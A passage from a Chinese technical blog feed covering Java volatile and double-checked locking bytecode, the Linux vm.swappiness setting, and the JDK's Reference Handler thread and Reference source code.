<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>: monitorenter</span><br><span class="line"><span class="number">11</span>: aload_0</span><br><span class="line">12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">15</span>: ifnonnull     <span class="number">30</span></span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">18</span>: aload_0</span><br><span class="line">19: new           #3                  // class Foo$Helper</span><br><span class="line"><span class="number">22</span>: dup</span><br><span class="line"><span class="number">23</span>: aload_0</span><br><span class="line">24: invokespecial #4                  // Method Foo$Helper."&lt;init&gt;":(LFoo;)V</span><br><span class="line">27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line"><span class="number">30</span>: aload_1</span><br><span class="line"><span class="comment">//-------------------------------------</span></span><br><span class="line"><span class="number">31</span>: monitorexit</span><br></pre></td></tr></table></figure>
<p>稍微补充下字节码的指令知识:</p>
<blockquote>
<p>aload_0 获取的是本地变量表中对象的引用，a代表引用类型，0表示本地表量表中变量的索引，通常0这个位置的引用，一般都是 this 对象。iload_0 获取的是 下标为 0 的整数类型。<br>invokespecial会消耗掉操作数栈顶的引用作为传给构造器的“this”参数，所以如果我们希望在invokespecial调用后在操作数栈顶还维持有一个指向新建对象的引用，就得在invokespecial之前先“复制”一份引用——这就是这个dup的来源<br>可以看到，new字节码指令的作用是, 创建指定类型的对象实例、对其进行默认初始化，并且将指向该实例的一个引用压入操作数栈顶；</p>
</blockquote>
<p>因为<code>new</code>操作并不是一个原子的操作, 他是分了三步的, 如果没有volatile, 这里就有可能发生重排序, 导致另外的线程拿到的是一个初始化了一半的对象.</p>
<h2 id="JMM规范"><a href="#JMM规范" class="headerlink" title="JMM规范"></a>JMM规范</h2><p><code>JMM</code>(JSR-133)规定了每个线程都有一个工作内存, </p>
<blockquote>
<p>Every thread is defined to have a working memory (an abstraction of caches and registers) in which to store values.<br>线程的工作内存, 理解为cpu的cache或者register就行了. </p>
</blockquote>
<img src="/2018/07/08/volatile/cache.gif" title="cpu的cache">
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/" rel="external nofollow noopener noreferrer" target="_blank">The Java Memory Model</a></li>
<li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/CommunityReview.pdf" rel="external nofollow noopener noreferrer" target="_blank">JSR-133</a></li>
<li><a href="http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html" rel="external nofollow noopener noreferrer" target="_blank">The “Double-Checked Locking is Broken” Declaration</a></li>
<li><a href="https://www.zhihu.com/question/52749416" rel="external nofollow noopener noreferrer" target="_blank">关于JVM字节码中dup指令的问题？ - 知乎</a></li>
<li><a href="https://tech.meituan.com/java-memory-reordering.html" rel="external nofollow noopener noreferrer" target="_blank">Java内存访问重排序的研究 -</a></li>
<li><a href="https://blog.csdn.net/Marvel__Dead/article/details/75193914" rel="external nofollow noopener noreferrer" target="_blank">字节码指令级别从i++说到volatile，深入理解i++的线程安全问题 - CSDN博客</a></li>
<li><a href="https://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly" rel="external nofollow noopener noreferrer" target="_blank">c++ - What does the “lock” instruction mean in x86 assembly? - Stack Overflow</a></li>
<li><a href="https://stackoverflow.com/questions/19652824/why-can-memorybarrier-be-implemented-as-a-call-to-xchg" rel="external nofollow noopener noreferrer" target="_blank">windows - why can MemoryBarrier be implemented as a call to xchg? - Stack Overflow</a></li>
<li><a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html" rel="external nofollow noopener noreferrer" target="_blank">Intel® 64 and IA-32 Architectures Developer’s Manual: Vol. 3A</a></li>
<li><a href="http://gee.cs.oswego.edu/dl/cpj/jmm.html" rel="external nofollow noopener noreferrer" target="_blank">Synchronization and the Java Memory Model</a></li>
<li><a href="http://www.cnblogs.com/dolphin0520/p/3920373.html" rel="external nofollow noopener noreferrer" target="_blank">Java并发编程：volatile关键字解析 - 海 子 - 博客园</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> volatile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[swappiness]]></title>
      <url>http://qsli.github.io/2018/07/08/swap/</url>
      <content type="html"><![CDATA[<h2 id="sysctl中和swap相关的参数"><a href="#sysctl中和swap相关的参数" class="headerlink" title="sysctl中和swap相关的参数"></a>sysctl中和swap相关的参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo sysctl -a  | grep swap</span><br><span class="line">vm.swappiness = 0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Swappiness is a Linux kernel parameter that controls the relative weight given to swapping out of runtime memory, as opposed to dropping pages from the system page cache. Swappiness can be set to values between 0 and 100 inclusive. A low value causes the kernel to avoid swapping; a higher value causes the kernel to try to use swap space.<br>取值说明:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness = 0，表示只有在避免OOM的时候才进行swap操作；(并不是关闭swap)</span><br><span class="line">vm.swappiness = 60，系统默认值；</span><br><span class="line">vm.swappiness = 100，系统主动的进行swap操作。</span><br></pre></td></tr></table></figure>
<h2 id="关闭swap"><a href="#关闭swap" class="headerlink" title="关闭swap"></a>关闭swap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br><span class="line">sudo echo 0 | sudo tee /proc/sys/vm/swappiness</span><br><span class="line">sudo swapoff/swapon -a</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDcyMTQyNQ==&amp;mid=206046053&amp;idx=1&amp;sn=76f7a31003d80c3089c3a266e4b139e0&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd" rel="external nofollow noopener noreferrer" target="_blank">Qunar技术沙龙</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> swap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java中的引用]]></title>
      <url>http://qsli.github.io/2018/07/08/reference/</url>
      <content type="html"><![CDATA[<h2 id="jvm中的Reference-Handler线程"><a href="#jvm中的Reference-Handler线程" class="headerlink" title="jvm中的Reference Handler线程"></a>jvm中的<code>Reference Handler</code>线程</h2><p>经常看<code>jstack</code>的输出就会发现一个常见的线程 – <code>Reference Handler</code>, 堆栈如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os_prio=0 tid=0x00007f873013e000 nid=0x18d7 in Object.wait() [0x00007f873443b000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">	at java.lang.Object.wait(Native Method)</span><br><span class="line">	at java.lang.Object.wait(Object.java:502)</span><br><span class="line">	at java.lang.ref.Reference.tryHandlePending(Reference.java:191)</span><br><span class="line">	- locked &lt;0x00000000e0e1e9b8&gt; (a java.lang.ref.Reference$Lock)</span><br><span class="line">	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)</span><br><span class="line"></span><br><span class="line">&quot;VM Thread&quot; os_prio=0 tid=0x00007f8730136800 nid=0x18d6 runnable</span><br></pre></td></tr></table></figure>
<p>看线程栈, 执行到<code>Reference</code>下的<code>tryHandlePending</code>方法就成了<code>WAIT</code>状态, 带着好奇心去翻翻源码.</p>
<h3 id="何时启动"><a href="#何时启动" class="headerlink" title="何时启动?"></a>何时启动?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reference类中的静态代码块</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line">        ThreadGroup tg = Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">for</span> (ThreadGroup tgn = tg;</span><br><span class="line">             tgn != <span class="keyword">null</span>;</span><br><span class="line">             tg = tgn, tgn = tg.getParent());</span><br><span class="line">        <span class="comment">// 这里创建线程, 传入线程group和线程的名称, 堆栈中的名称就来自于此</span></span><br><span class="line">        Thread handler = <span class="keyword">new</span> ReferenceHandler(tg, <span class="string">"Reference Handler"</span>);</span><br><span class="line">        <span class="comment">/* If there were a special system-only priority greater than</span></span><br><span class="line"><span class="comment">         * MAX_PRIORITY, it would be used here</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        handler.setPriority(Thread.MAX_PRIORITY);</span><br><span class="line">        handler.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        handler.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// provide access in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaLangRefAccess(<span class="keyword">new</span> JavaLangRefAccess() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryHandlePendingReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> tryHandlePending(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>Reference</code>在被加载的时候就会触发<code>static</code>里的代码执行, 就会创建<code>Reference Handler</code>线程并启动.<br>至于<code>SharedSecrets</code>, 这个类类似一个Holder, 保存了一些对象的引用, 并提供了一些get/set方法.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedSecrets</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe unsafe = Unsafe.getUnsafe();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilJarAccess javaUtilJarAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangAccess javaLangAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaLangRefAccess javaLangRefAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOAccess javaIOAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetAccess javaNetAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNetHttpCookieAccess javaNetHttpCookieAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaNioAccess javaNioAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaIOFileDescriptorAccess javaIOFileDescriptorAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityProtectionDomainAccess javaSecurityProtectionDomainAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaSecurityAccess javaSecurityAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaUtilZipFileAccess javaUtilZipFileAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaAWTAccess javaAWTAccess;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> JavaObjectInputStreamAccess javaObjectInputStreamAccess;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SharedSecrets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getter和setter方法省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="这个线程做了什么"><a href="#这个线程做了什么" class="headerlink" title="这个线程做了什么?"></a>这个线程做了什么?</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang.ref.Reference.ReferenceHandler</span></span><br><span class="line">  <span class="comment">/* High-priority thread to enqueue pending References</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceHandler</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 采用反射的方式触发类的加载</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(clazz.getName(), <span class="keyword">true</span>, clazz.getClassLoader());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (Error) <span class="keyword">new</span> NoClassDefFoundError(e.getMessage()).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="comment">// pre-load and initialize InterruptedException and Cleaner classes</span></span><br><span class="line">            <span class="comment">// so that we don't get into trouble later in the run loop if there's</span></span><br><span class="line">            <span class="comment">// memory shortage while loading/initializing them lazily.</span></span><br><span class="line">            ensureClassInitialized(InterruptedException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="comment">// 和DirectMemory相关的Cleaner类</span></span><br><span class="line">            ensureClassInitialized(Cleaner<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceHandler(ThreadGroup g, String name) &#123;</span><br><span class="line">            <span class="keyword">super</span>(g, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">// 调用Reference类的方法</span></span><br><span class="line">                tryHandlePending(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个线程其实只是在死循环中调用了<code>Reference</code>的<code>tryHandlePending</code>来清理无效的<code>Reference</code>.</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Java中有四种引用, <code>StrongReference</code>, <code>SoftReference</code>, <code>WeakReference</code>, <code>PhantomReference</code>, 除了<code>StrongReference</code>其他的三种都有对应的类:</p>
<img src="/2018/07/08/reference/reference.jpg" title="Reference">
<h3 id="引用的状态"><a href="#引用的状态" class="headerlink" title="引用的状态"></a>引用的状态</h3><ul>
<li><code>Active</code>: Newly-created instances are Active.</li>
<li><code>Pending</code>: An element of the pending-Reference list, waiting to be enqueued by the Reference-handler thread.  Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li>
<li><code>Enqueued</code>: An element of the queue with which the instance was registered when it was created.  When an instance is removed from its ReferenceQueue, it is made Inactive. Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li>
<li><code>Inactive</code>: Nothing more to do.  Once an instance becomes Inactive its state will never change again.(终态)</li>
</ul>
<h3 id="引用链表"><a href="#引用链表" class="headerlink" title="引用链表"></a>引用链表</h3><p><code>Reference</code>中有五个关键的变量:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> T referent;         <span class="comment">/* Treated specially by GC */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">volatile</span> ReferenceQueue&lt;? <span class="keyword">super</span> T&gt; queue;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   NULL</span></span><br><span class="line"><span class="comment">    *     pending:   this</span></span><br><span class="line"><span class="comment">    *    Enqueued:   next reference in queue (or this if last)</span></span><br><span class="line"><span class="comment">    *    Inactive:   this</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">   Reference next;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   next element in a discovered reference list maintained by GC (or this if last)</span></span><br><span class="line"><span class="comment">    *     pending:   next element in the pending list (or null if last)</span></span><br><span class="line"><span class="comment">    *   otherwise:   NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">transient</span> <span class="keyword">private</span> Reference&lt;T&gt; discovered;  <span class="comment">/* used by VM */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* List of References waiting to be enqueued.  The collector adds</span></span><br><span class="line"><span class="comment">    * References to this list, while the Reference-handler thread removes</span></span><br><span class="line"><span class="comment">    * them.  This list is protected by the above lock object. The</span></span><br><span class="line"><span class="comment">    * list uses the discovered field to link its elements.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Reference&lt;Object&gt; pending = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>referent</code></p>
<p>代表当前持有的引用. </p>
</li>
<li><p><code>queue</code></p>
<p>是初始化的时候传入的, 可以为null, 如果传入了<code>ReferenceQueue</code>, 会有入队列和出队列的操作</p>
</li>
<li><p><code>next</code></p>
<p>代表<code>ReferenceQueue</code>中的下一个, <code>Active</code>状态下是null,<br><code>Pending</code>和<code>Inactive</code>状态下指向自己, </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   +-------+</span><br><span class="line">   |       |</span><br><span class="line">   v       |</span><br><span class="line">           |</span><br><span class="line">+-----+    |</span><br><span class="line">|     |    |</span><br><span class="line">|  1  +----+</span><br><span class="line">|     |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure>
<p><code>Enqueued</code>状态下指向<code>queue</code>中的下一个元素</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                         +-------+</span><br><span class="line">                         |       |</span><br><span class="line">                         v       |</span><br><span class="line">                                 |</span><br><span class="line">+-----+    +-----+    +-----+    |</span><br><span class="line">|     |    |     |    |     |    |</span><br><span class="line">|  1  +--&gt; |  2  +--&gt; |  3  +----+</span><br><span class="line">|     |    |     |    |     |</span><br><span class="line">+-----+    +-----+    +-----+</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>discovered</code></p>
<p><code>Active</code>状态下指向<code>discovered reference list</code>中的下一个元素,<br><code>Pending</code>状态下指向<code>pending list</code>中的下一个元素,<br>其他状态下是null, 相关的链表是JVM维护的</p>
</li>
<li><p><code>pending</code></p>
</li>
</ul>
<p><code>pending</code>指向的是<code>pending list</code>链表的head</p>
<h3 id="tryHandlePending"><a href="#tryHandlePending" class="headerlink" title="tryHandlePending"></a>tryHandlePending</h3><p>处理引用的代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try handle pending &#123;<span class="doctag">@link</span> Reference&#125; if there is one.&lt;p&gt;</span></span><br><span class="line"><span class="comment">     * Return &#123;<span class="doctag">@code</span> true&#125; as a hint that there might be another</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125; pending or &#123;<span class="doctag">@code</span> false&#125; when there are no more pending</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125;s at the moment and the program can do some other</span></span><br><span class="line"><span class="comment">     * useful work instead of looping.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> waitForNotify if &#123;<span class="doctag">@code</span> true&#125; and there was no pending</span></span><br><span class="line"><span class="comment">     *                      &#123;<span class="doctag">@link</span> Reference&#125;, wait until notified from VM</span></span><br><span class="line"><span class="comment">     *                      or interrupted; if &#123;<span class="doctag">@code</span> false&#125;, return immediately</span></span><br><span class="line"><span class="comment">     *                      when there is no pending &#123;<span class="doctag">@link</span> Reference&#125;.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if there was a &#123;<span class="doctag">@link</span> Reference&#125; pending and it</span></span><br><span class="line"><span class="comment">     *         was processed, or we waited for notification and either got it</span></span><br><span class="line"><span class="comment">     *         or thread was interrupted before being notified;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> false&#125; otherwise.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">tryHandlePending</span><span class="params">(<span class="keyword">boolean</span> waitForNotify)</span> </span>&#123;</span><br><span class="line">        Reference&lt;Object&gt; r;</span><br><span class="line">        Cleaner c;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                <span class="comment">// pending list不为null, 说明有需要处理的引用</span></span><br><span class="line">                <span class="keyword">if</span> (pending != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    r = pending;</span><br><span class="line">                    <span class="comment">// 'instanceof' might throw OutOfMemoryError sometimes</span></span><br><span class="line">                    <span class="comment">// so do this before un-linking 'r' from the 'pending' chain...</span></span><br><span class="line">                    c = r <span class="keyword">instanceof</span> Cleaner ? (Cleaner) r : <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// unlink 'r' from 'pending' chain</span></span><br><span class="line">                    <span class="comment">// 从pending list中删除r</span></span><br><span class="line">                    pending = r.discovered;</span><br><span class="line">                    r.discovered = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// The waiting on the lock may cause an OutOfMemoryError</span></span><br><span class="line">                    <span class="comment">// because it may try to allocate exception objects.</span></span><br><span class="line">                    <span class="keyword">if</span> (waitForNotify) &#123;</span><br><span class="line">                        <span class="comment">// 没有需要处理的引用, 就wait, 这个应该会被JVM给notify</span></span><br><span class="line">                        lock.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// retry if waited</span></span><br><span class="line">                    <span class="keyword">return</span> waitForNotify;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OutOfMemoryError x) &#123;</span><br><span class="line">            <span class="comment">// Give other threads CPU time so they hopefully drop some live references</span></span><br><span class="line">            <span class="comment">// and GC reclaims some space.</span></span><br><span class="line">            <span class="comment">// Also prevent CPU intensive spinning in case 'r instanceof Cleaner' above</span></span><br><span class="line">            <span class="comment">// persistently throws OOME for some time...</span></span><br><span class="line">            Thread.yield();</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fast path for cleaners</span></span><br><span class="line">        <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">            c.clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceQueue&lt;? <span class="keyword">super</span> Object&gt; q = r.queue;</span><br><span class="line">        <span class="comment">// 如果关联了ReferenceQueue, 就加入到ReferenceQueue中</span></span><br><span class="line">        <span class="keyword">if</span> (q != ReferenceQueue.NULL) q.enqueue(r);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="ReferenceQueue"><a href="#ReferenceQueue" class="headerlink" title="ReferenceQueue"></a>ReferenceQueue</h2><p><code>ReferenceQueue</code>用一个链表来维护队列里的<code>Reference</code></p>
<p>入队列相关的操作:</p>
